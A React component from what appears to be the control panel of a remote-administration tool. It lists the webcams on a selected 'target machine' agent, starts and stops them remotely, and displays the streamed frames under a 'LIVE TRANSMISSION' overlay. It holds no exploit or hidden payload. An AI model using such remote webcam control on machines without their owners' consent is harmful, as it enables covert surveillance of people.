import React, { useState, useEffect } from 'react';
import { Camera, Video, VideoOff, RefreshCw, Loader2, Signal } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';
import { CyberCard, CyberButton } from './CyberUI';

const WebcamCard = () => {
    const { socket, selectedAgentId } = useSocket();
    const [activeCam, setActiveCam] = useState<number | null>(null);
    const [isStreaming, setIsStreaming] = useState(false);
    const [imageSrc, setImageSrc] = useState<string | null>(null);
    const [cameras, setCameras] = useState<string[]>([]);

    // --- FIX LỖI: Lắng nghe sự kiện nhận ảnh từ Server ---
    useEffect(() => {
        if (!socket) return;

        // 1. Nhận danh sách Webcam
        socket.on("ReceiveWebcamList", (camList: string[]) => {
            setCameras(camList);
            if(camList.length === 0) alert("Không tìm thấy Camera nào trên máy Client!");
        });

        // 2. Nhận dữ liệu hình ảnh (Frame)
        socket.on("ReceiveWebcamFrame", (base64String: string) => {
            setImageSrc(`data:image/jpeg;base64,${base64String}`);
        });

        return () => {
            socket.off("ReceiveWebcamList");
            socket.off("ReceiveWebcamFrame");
        };
    }, [socket]);

    const handleGetWebcams = () => {
        if (!selectedAgentId) return alert("⚠ CHƯA CHỌN MÁY MỤC TIÊU!");
        sendCommand("get_webcams");
    };

    const handleStartCam = (index: number) => {
        if (!selectedAgentId) return;
        sendCommand("start_webcam", index);
        setActiveCam(index);
        setIsStreaming(true);
    };

    const handleStopCam = () => {
        sendCommand("stop_webcam");
        setIsStreaming(false);
        setActiveCam(null);
        setImageSrc(null); // Xóa ảnh khi dừng
    };

    return (
        <CyberCard title="WEBCAM_UPLINK" className="h-full flex flex-col">
            {/* Header Status */}
            <div className="flex justify-between items-center mb-2 px-2 text-[10px] font-mono border-b border-gray-800 pb-2">
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isStreaming ? 'bg-cyber-red animate-pulse' : 'bg-gray-600'}`}></div>
                    <span className={isStreaming ? 'text-cyber-red font-bold' : 'text-gray-500'}>
                        {isStreaming ? 'LIVE TRANSMISSION' : 'OFFLINE'}
                    </span>
                </div>
                {cameras.length > 0 && <span className="text-cyber-blue">DEVICES: {cameras.length}</span>}
            </div>

            {/* Màn hình hiển thị Camera */}
            <div className="relative flex-1 bg-black border border-gray-800 min-h-[200px] overflow-hidden group flex items-center justify-center">
                {imageSrc ? (
                    <img src={imageSrc} alt="Webcam Stream" className="w-full h-full object-contain" />
                ) : (
                    <div className="text-center opacity-50">
                        {isStreaming ? (
                            <div className="flex flex-col items-center gap-2">
                                <Loader2 className="w-8 h-8 text-cyber-yellow animate-spin" />
                                <span className="text-xs text-cyber-yellow">WAITING FOR SIGNAL...</span>
                            </div>
                        ) : (
                            <div className="flex flex-col items-center gap-2">
                                <Camera className="w-12 h-12 text-gray-700" />
                                <span className="text-[10px] text-gray-600">NO VIDEO FEED</span>
                            </div>
                        )}
                    </div>
                )}
                
                {/* Overlay hiệu ứng */}
                <div className="absolute inset-0 pointer-events-none border-[0.5px] border-cyber-blue/10 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.1)_50%)] bg-[length:100%_4px]">
                    {isStreaming && (
                        <div className="absolute top-2 left-2 text-[8px] text-cyber-red animate-pulse flex items-center gap-1">
                            <div className="w-1.5 h-1.5 bg-cyber-red rounded-full"></div> REC
                        </div>
                    )}
                </div>
            </div>

            {/* Controls */}
            <div className="mt-4 flex flex-col gap-2">
                {/* Nút Scan Devices */}
                <CyberButton onClick={handleGetWebcams} disabled={isStreaming} variant="ghost" className="w-full py-1 text-[10px]">
                    <RefreshCw className="w-3 h-3 mr-2" /> SCAN DEVICES
                </CyberButton>

                {/* Danh sách Camera */}
                <div className="flex flex-col gap-2 max-h-[100px] overflow-y-auto custom-scrollbar">
                    {cameras.length > 0 ? (
                        cameras.map((cam, idx) => (
                            <div key={idx} className="flex gap-2">
                                <div className="flex-1 bg-[#111] border border-gray-800 p-2 text-[10px] text-gray-400 truncate flex items-center">
                                    <Video className="w-3 h-3 mr-2 shrink-0" />
                                    <span className="truncate">{cam}</span>
                                </div>
                                {activeCam === idx ? (
                                    <CyberButton onClick={handleStopCam} variant="danger" className="py-1 px-2 text-[10px]">STOP</CyberButton>
                                ) : (
                                    <CyberButton onClick={() => handleStartCam(idx)} variant="secondary" disabled={isStreaming} className="py-1 px-2 text-[10px]">START</CyberButton>
                                )}
                            </div>
                        ))
                    ) : (
                        <div className="text-[10px] text-center text-gray-600 italic py-2 border border-dashed border-gray-800">
                            Scan to find cameras...
                        </div>
                    )}
                </div>
            </div>
        </CyberCard>
    );
};

export default WebcamCard;